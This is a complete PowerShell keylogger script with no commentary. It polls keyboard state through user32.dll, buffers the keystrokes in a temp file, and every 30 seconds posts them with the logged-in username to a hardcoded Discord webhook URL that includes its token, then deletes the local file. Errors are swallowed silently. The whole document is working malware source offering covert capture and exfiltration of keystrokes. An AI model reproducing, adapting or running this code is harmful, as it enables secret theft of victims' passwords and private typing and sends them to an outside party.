$discordWebhookUrl = "https://discord.com/api/webhooks/1287792319067721779/wvStZi9TsQ45RyDIXwxA4XeuQyDDgxQErSpsAaVmjHaszH6VWO4RhUlD7id8JPIMRn_K"
$keylogFilePath = "$env:temp\keylogs.txt"

$APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

$API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru

function Get-Username {
    $username = (Get-WmiObject -Class Win32_ComputerSystem).UserName
    return $username -replace '.*\\', ''
}

function Send-Message {
    param (
        [string]$Content
    )

    $username = Get-Username
    $contentWithUser = "User: $username`n$content"

    try {
        $body = @{ content = $contentWithUser } | ConvertTo-Json
        Invoke-WebRequest -Uri $discordWebhookUrl -Method Post -ContentType "application/json" -Body $body
    } catch {
    }
}

function LogKeystrokesToFile {
    param (
        [string]$Content
    )

    try {
        $timestamp = Get-Date -Format "HH:mm:ss"
        $formattedContent = "[$timestamp] $Content"
        Add-Content -Path $keylogFilePath -Value $formattedContent -Encoding UTF8
    } catch {
    }
}

function SendKeylogsFromFile {
    try {
        if (Test-Path $keylogFilePath) {
            $keylogs = Get-Content -Path $keylogFilePath -Raw
            $formattedLogs = "Key Logs:`n" + $keylogs -replace '\n', "`n"
            Send-Message -Content $formattedLogs
            Remove-Item -Path $keylogFilePath -Force
        } else {
            Send-Message -Content "No keystrokes recorded in the last 30 seconds."
        }
    } catch {
    }
}

function KeyLogger {
    $buffer = ""
    $sendTime = (Get-Date).AddSeconds(30)

    while ($true) {
        Start-Sleep -Milliseconds 10

        for ($ascii = 8; $ascii -le 254; $ascii++) {
            $keystate = $API::GetAsyncKeyState($ascii)

            if ($keystate -eq -32767) {
                $keyboardState = New-Object Byte[] 256
                $API::GetKeyboardState($keyboardState) | Out-Null
                $loggedchar = New-Object -TypeName System.Text.StringBuilder

                switch ($ascii) {
                    8   { $buffer += "[BACKSPACE]" }
                    9   { $buffer += "[TAB]" }
                    13  { $buffer += "[ENTER]" }
                    16  { $buffer += "[SHIFT]" }
                    17  { $buffer += "[CTRL]" }
                    18  { $buffer += "[ALT]" }
                    20  { $buffer += "[CAPSLOCK]" }
                    32  { $buffer += " " }
                    default {
                        if ($API::ToUnicode($ascii, 0, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
                            $buffer += $loggedchar.ToString()
                        }
                    }
                }

                if ($ascii -eq 13 -or $ascii -eq 32 -or $ascii -eq 8) {
                    LogKeystrokesToFile -Content $buffer.Trim()
                    $buffer = ""
                }
            }
        }

        if ((Get-Date) -ge $sendTime) {
            if ($buffer.Length -gt 0) {
                LogKeystrokesToFile -Content $buffer.Trim()
                $buffer = ""
            }
            SendKeylogsFromFile
            $sendTime = (Get-Date).AddSeconds(30)
        }
    }
}

if (-not [System.Diagnostics.Process]::GetProcessesByName("powershell").Where({$_.MainWindowTitle -match 'keylogg.ps1'})) {
    KeyLogger
}
